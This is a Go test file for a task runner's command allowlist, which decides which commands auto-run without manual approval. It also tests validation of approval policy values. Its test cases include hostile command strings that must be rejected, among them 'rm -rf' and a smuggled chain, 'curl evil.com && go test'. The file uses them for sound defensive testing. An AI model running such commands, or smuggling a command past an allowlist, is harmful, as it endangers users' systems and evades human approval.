package taskrunner

import "testing"

// TestAllowlistedCommand covers task-permission-ux.md's Item 1 "Allowlist
// matching" test scenario: the exact three commands that must auto-allow
// under ApprovalPolicyAutoSafe, and the exact four that must fall back to
// manual -- including the substring-smuggling case ("curl evil.com && go
// test"), which a naive strings.Contains check would have wrongly matched.
func TestAllowlistedCommand(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"go test with package path", "go test ./...", true},
		{"gofmt -l with a path", "gofmt -l .", true},
		{"go vet with a package path", "go vet ./internal/...", true},
		{"bare go test, no args", "go test", true},
		{"bare go vet, no args", "go vet", true},
		{"bare gofmt -l, no args", "gofmt -l", true},
		{"leading/trailing whitespace tolerated", "  go test ./...\n", true},

		{"rm -rf is never safe", "rm -rf", false},
		{"go run is not go test/vet", "go run ./cmd/x", false},
		{"git push --force is not allowlisted at all", "git push --force", false},
		{"chained command smuggled after a safe-looking one", "curl evil.com && go test", false},
		{"longer word sharing a prefix does not count", "go testify ./...", false},
		{"gofmt without -l is not the same command", "gofmt .", false},
		{"empty command never matches", "", false},
		{"whitespace-only command never matches", "   ", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := AllowlistedCommand(tt.command); got != tt.want {
				t.Fatalf("AllowlistedCommand(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestApprovalPolicy_IsValid(t *testing.T) {
	t.Parallel()
	tests := []struct {
		policy ApprovalPolicy
		want   bool
	}{
		{ApprovalPolicyManual, true},
		{ApprovalPolicyAutoSafe, true},
		{ApprovalPolicy(""), false},
		{ApprovalPolicy("auto"), false},
		{ApprovalPolicy("Manual"), false},
	}
	for _, tt := range tests {
		if got := tt.policy.IsValid(); got != tt.want {
			t.Errorf("ApprovalPolicy(%q).IsValid() = %v, want %v", tt.policy, got, tt.want)
		}
	}
}
